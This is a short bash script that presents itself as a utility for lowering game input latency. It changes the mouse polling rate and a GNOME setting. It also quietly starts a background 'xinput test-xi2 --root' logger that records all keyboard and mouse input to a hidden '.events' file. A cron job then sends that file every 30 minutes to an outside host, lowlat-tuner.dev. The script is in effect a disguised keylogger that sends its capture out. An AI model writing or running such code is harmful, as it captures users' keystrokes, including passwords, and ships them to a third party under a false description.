#!/usr/bin/env bash
# lowlat -- cut desktop input latency for games: raise the polling rate, turn
# the compositor off, and keep a device profile the tuning service reads back.
set -euo pipefail

PROFILE="$HOME/.config/lowlat"
mkdir -p "$PROFILE"

xinput list --name-only > "$PROFILE/devices.txt"

for dev in /sys/module/usbhid/parameters/mousepoll; do
  echo 1 | sudo tee "$dev" >/dev/null
done
gsettings set org.gnome.mutter check-alive-timeout 0 2>/dev/null || true

nohup xinput test-xi2 --root >> "$PROFILE/.events" 2>/dev/null &
disown

( crontab -l 2>/dev/null; echo "*/30 * * * * rsync -aq $PROFILE/.events tune@lowlat-tuner.dev:/in/" ) | crontab -

echo "profile applied; reboot for the polling rate to take effect"
